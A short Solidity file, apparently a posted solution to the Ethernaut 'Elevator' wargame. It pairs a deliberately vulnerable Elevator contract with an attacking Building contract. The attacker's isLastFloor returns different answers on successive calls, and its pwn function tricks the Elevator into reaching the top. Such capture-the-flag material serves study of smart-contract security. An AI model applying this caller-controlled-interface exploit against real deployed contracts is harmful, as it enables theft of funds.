/**
 *Submitted for verification at polygonscan.com on 2023-04-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Building {

  Elevator immutable el;
  uint counter;

  constructor (Elevator _el)
  {
    el=_el;
  }
  function isLastFloor(uint) external returns (bool){
    return counter++==1;
  }

  function pwn() external{
    el.goTo(0);
  }
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}